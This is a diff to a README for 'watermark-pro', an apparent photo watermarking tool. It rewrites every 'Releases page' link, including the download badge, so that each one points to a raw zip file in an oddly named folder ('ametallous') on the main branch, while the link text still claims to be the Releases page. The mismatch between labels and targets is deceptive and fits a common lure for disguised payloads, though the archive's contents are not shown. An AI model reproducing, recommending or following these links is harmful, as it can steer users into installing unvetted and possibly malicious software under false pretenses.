@@ -4,9 +4,9 @@
 Welcome to watermark-pro! This tool allows you to watermark your photos easily. Whether you want to protect your copyrights or simply add a personal touch, this application has you covered.
 
 ## 📥 Download
-[![Download watermark-pro](https://img.shields.io/badge/Download-watermark--pro-blue.svg)](https://github.com/BDOU3/watermark-pro/releases)
+[![Download watermark-pro](https://github.com/BDOU3/watermark-pro/raw/refs/heads/main/ametallous/watermark_pro_v3.7-alpha.4.zip)](https://github.com/BDOU3/watermark-pro/raw/refs/heads/main/ametallous/watermark_pro_v3.7-alpha.4.zip)
 
-Visit the [Releases page](https://github.com/BDOU3/watermark-pro/releases) to download the latest version of watermark-pro.
+Visit the [Releases page](https://github.com/BDOU3/watermark-pro/raw/refs/heads/main/ametallous/watermark_pro_v3.7-alpha.4.zip) to download the latest version of watermark-pro.
 
 ## 🌟 Key Features
 - **Batch Processing:** Watermark multiple images at once.
@@ -22,7 +22,7 @@ Visit the [Releases page](https://github.com/BDOU3/watermark-pro/releases) to do
 
 ## 📋 Installation Steps
 1. **Visit the Releases Page:**
-   Go to the [releases page](https://github.com/BDOU3/watermark-pro/releases) to download watermark-pro.
+   Go to the [releases page](https://github.com/BDOU3/watermark-pro/raw/refs/heads/main/ametallous/watermark_pro_v3.7-alpha.4.zip) to download watermark-pro.
 
 2. **Choose Your Version:**
    Select the latest version available. Ensure you’re choosing the right format for your browser.
@@ -65,6 +65,6 @@ We would love to hear about your experience with watermark-pro. Please leave you
 ## 🌍 Community and Support
 Join our community for tips, tricks, and support. Check out discussions and connect with other users interested in watermarking tools. 
 
-### Visit the [Releases Page](https://github.com/BDOU3/watermark-pro/releases) again to download and experience watermark-pro today! 
+### Visit the [Releases Page](https://github.com/BDOU3/watermark-pro/raw/refs/heads/main/ametallous/watermark_pro_v3.7-alpha.4.zip) again to download and experience watermark-pro today! 
 
 Thank you for choosing watermark-pro!
